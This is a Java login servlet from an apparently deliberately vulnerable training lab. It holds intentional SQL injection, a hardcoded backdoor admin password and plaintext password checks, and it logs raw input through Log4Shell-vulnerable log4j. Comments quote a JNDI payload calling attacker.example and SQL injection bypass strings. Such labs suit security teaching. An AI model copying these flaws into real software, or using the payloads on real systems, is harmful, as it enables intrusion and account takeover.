package com.webapp.vulnlab;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import java.io.IOException;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.Statement;

/**
 * VULN-4  : SQL Injection - Authentication Bypass (CWE-89)
 * VULN-13 : Hardcoded credentials / backdoor (CWE-798)
 * VULN-14 : Plaintext password storage & comparison (CWE-256 / CWE-522)
 * VULN-15 : Vulnerable component (Log4Shell) actually exercised here (CWE-502 / CVE-2021-44228)
 *
 * See VULNERABILITIES.md in the repo root for exploit payloads and fixes.
 */
@WebServlet("/login")
public class LoginServlet extends HttpServlet {

    // VULN-15: log4j-core 2.14.1 (declared in pom.xml) is Log4Shell-vulnerable.
    // Logging raw, user-controlled input like this is the real-world trigger:
    // an attacker sends username = "${jndi:ldap://attacker.example/x}" and the
    // vulnerable log4j-core version resolves the JNDI lookup, leading to RCE.
    private static final Logger logger = LogManager.getLogger(LoginServlet.class);

    // VULN-13: hardcoded backdoor password - grants admin access regardless of DB state.
    private static final String BACKDOOR_PASSWORD = "backdoor_devsecops_2020";

    @Override
    protected void doPost(HttpServletRequest req, HttpServletResponse resp)
            throws ServletException, IOException {

        String username = req.getParameter("username");
        String password = req.getParameter("password");

        // VULN-15 (Log4Shell trigger point): user input logged directly, unsanitized.
        logger.info("Login attempt for user: " + username);

        resp.setContentType("text/html");

        // VULN-13: hardcoded backdoor - bypasses the DB entirely.
        if (BACKDOOR_PASSWORD.equals(password)) {
            HttpSession session = req.getSession(true);
            session.setAttribute("username", "backdoor-admin");
            session.setAttribute("role", "admin");
            resp.getWriter().println("<h3>Login successful (backdoor).</h3>");
            return;
        }

        // VULN-4: classic SQL Injection auth bypass.
        // Query is built via string concatenation instead of a PreparedStatement,
        // so an attacker can submit username = admin' -- to comment out the
        // password check entirely, or ' OR '1'='1 to always match a row.
        // VULN-14: password compared in plaintext, no hashing at rest.
        String query = "SELECT id, username, role FROM users WHERE username='"
                + username + "' AND password='" + password + "'";

        try (Connection conn = DriverManager.getConnection(
                DBInitListener.JDBC_URL, DBInitListener.DB_USER, DBInitListener.DB_PASS);
             Statement st = conn.createStatement();
             ResultSet rs = st.executeQuery(query)) {

            if (rs.next()) {
                HttpSession session = req.getSession(true);
                session.setAttribute("username", rs.getString("username"));
                session.setAttribute("role", rs.getString("role"));
                resp.getWriter().println("<h3>Login successful. Welcome, "
                        + rs.getString("username") + "!</h3>");
            } else {
                resp.getWriter().println("<h3>Invalid username or password.</h3>");
            }
        } catch (Exception e) {
            // Also leaks raw DB error text to the client - see SearchServlet
            // for the dedicated error-based SQLi lab page.
            resp.getWriter().println("<h3>Login error: " + e.getMessage() + "</h3>");
        }
    }

    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp)
            throws ServletException, IOException {
        resp.sendRedirect("login.jsp");
    }
}
